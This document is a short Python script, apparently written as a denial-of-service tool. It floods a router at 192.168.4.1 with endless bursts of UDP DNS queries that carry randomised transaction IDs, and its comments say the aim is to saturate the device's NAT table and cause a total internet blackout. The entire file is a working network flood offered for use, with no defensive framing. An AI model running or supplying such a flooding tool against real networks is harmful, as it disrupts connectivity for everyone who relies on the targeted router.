import socket
import time
import random

ROUTER_IP = "192.168.4.1"
# Target the main DNS forwarder port on the router to saturate translation states
TARGET_PORT = 53  
BURST_BATCH = 150 # Number of rapid requests per burst sweep

def launch_global_nat_blackout():
    print(f"[*] Targeting Routing Interface: {ROUTER_IP}:{TARGET_PORT}")
    print("[*] Configuration: LAYER 3 NAT TABLE SATURATION ENGINE")
    input("Press [ENTER] to execute a total external internet blackout...")
    
    cycle_count = 1
    # Build a standard DNS query structure to force the router to translate external traffic
    dns_query_base = (
        b'\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' # Header
        b'\x03www\x06google\x03com\x00\x00\x01\x00\x01'     # www.google.com
    )

    try:
        # Establish a persistent UDP interface socket channel
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while True:
            print(f"📡 [BLACKOUT LOOP] Flooding NAT translation tracking layer (Cycle #{cycle_count})...")
            
            for _ in range(BURST_BATCH):
                try:
                    # Dynamically modify the transaction ID bytes to force the ESP32 
                    # to create a brand new tracking allocation row in its RAM every time
                    dynamic_id = bytes([random.randint(0, 255), random.randint(0, 255)])
                    payload = dynamic_id + dns_query_base[2:]
                    
                    sock.sendto(payload, (ROUTER_IP, TARGET_PORT))
                except Exception:
                    pass
            
            cycle_count += 1
            # A 2-millisecond delay prevents your local operating system from dropping the loop
            time.sleep(0.002)

    except KeyboardInterrupt:
        print("\n[+] Blackout halted by user. Restoring NAT translation arrays.")

if __name__ == "__main__":
    launch_global_nat_blackout()
